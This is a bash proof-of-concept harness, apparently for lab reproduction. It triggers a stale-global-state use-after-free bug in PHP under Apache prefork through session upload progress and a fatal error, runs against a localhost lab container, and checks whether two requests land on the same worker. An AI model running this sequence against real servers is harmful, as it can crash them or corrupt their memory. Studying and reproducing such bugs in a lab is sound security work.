#!/usr/bin/env bash
# =============================================================
# CVE-2026-109619: Stale global state test harness
# =============================================================
#
# Goal: leave dangling internal state on a worker via request 1,
# then hit the same worker with request 2 before RINIT resets it.
#
# This is harder than 109618 because:
#   1. Both requests must land on the SAME Apache worker process.
#   2. Request 1 must create the stale state (via upload progress
#      or fatal error), and its memory must be freed.
#   3. Request 2 must arrive before the worker's initialization
#      for the new request overwrites the stale pointers.
#
# With mod_php prefork MPM, each child handles requests serially,
# so if you can identify which PID handled request 1, you just
# need request 2 to land on that same child.

TARGET="http://localhost:8080/stale_target.php"

echo "=== Step 0: Check worker pool ==="
echo "Identifying active worker PIDs..."
echo ""

# Hit the endpoint several times to see which PIDs are in the pool
for i in $(seq 1 5); do
    PID=$(curl -s "${TARGET}?action=info" | grep "Worker PID" | awk '{print $3}')
    echo "  Request $i -> PID $PID"
done
echo ""

echo "=== Step 1: Session upload progress path ==="
echo "The confirmed trigger: PHP_SESSION_UPLOAD_PROGRESS creates"
echo "internal tracking state tied to the session. When the request"
echo "ends, this state's memory is freed, but under the bug, the"
echo "pointer in the worker's globals may not be cleared."
echo ""

# Create a session cookie to reuse across requests
SESSION_COOKIE=$(mktemp)

# Request 1: trigger session upload progress tracking
# The key is the hidden field named PHP_SESSION_UPLOAD_PROGRESS
echo "Request 1: Triggering session upload progress..."
dd if=/dev/urandom of=/tmp/upload_test.bin bs=1K count=100 2>/dev/null

curl -s -c "$SESSION_COOKIE" -b "$SESSION_COOKIE" \
    -F "PHP_SESSION_UPLOAD_PROGRESS=lab_test" \
    -F "testfile=@/tmp/upload_test.bin" \
    "${TARGET}?action=upload"
echo ""

FIRST_PID=$(curl -s -b "$SESSION_COOKIE" "${TARGET}?action=info" | grep "Worker PID" | awk '{print $3}')
echo "Request 1 was handled by PID: $FIRST_PID"
echo ""

# Request 2: hit the same worker immediately
# With prefork and a small pool, rapid sequential requests often
# land on the same worker.
echo "Request 2: Immediately hitting the same endpoint..."
SECOND_PID=$(curl -s -b "$SESSION_COOKIE" "${TARGET}?action=info" | grep "Worker PID" | awk '{print $3}')
echo "Request 2 was handled by PID: $SECOND_PID"
echo ""

if [ "$FIRST_PID" = "$SECOND_PID" ]; then
    echo "SAME WORKER - both requests hit PID $FIRST_PID"
    echo "This is the precondition for the stale state attack."
else
    echo "DIFFERENT WORKERS - PID $FIRST_PID then $SECOND_PID"
    echo "Retry, or reduce MaxRequestWorkers to 1 to force it."
fi
echo ""

rm -f /tmp/upload_test.bin "$SESSION_COOKIE"

echo "=== Step 2: Fatal error path ==="
echo "The second confirmed path: a fatal error during request"
echo "processing can leave per-request globals in a stale state."
echo ""

echo "Request 1: Triggering fatal error..."
FATAL_RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET}?action=fatal" 2>&1)
echo "$FATAL_RESP"
echo ""

echo "Request 2: Immediate follow-up to same endpoint..."
FOLLOW_RESP=$(curl -s "${TARGET}?action=info")
echo "$FOLLOW_RESP"
echo ""

echo "=== What to observe ==="
echo ""
echo "Check: docker logs php2shell-lab"
echo ""
echo "Look for:"
echo "  - Segfaults (SIGSEGV) on the follow-up request"
echo "  - Corrupted session data"
echo "  - Unexpected values in PHP globals (visible via phpinfo)"
echo "  - 'use after free' in ASAN output (if built with sanitizers)"
echo ""
echo "=== For deterministic reproduction ==="
echo ""
echo "To guarantee both requests hit the same worker, set"
echo "MaxRequestWorkers 1 in the Apache config. This forces a"
echo "single-worker pool where every request goes to the same PID."
echo "See the apache-single-worker.conf file."
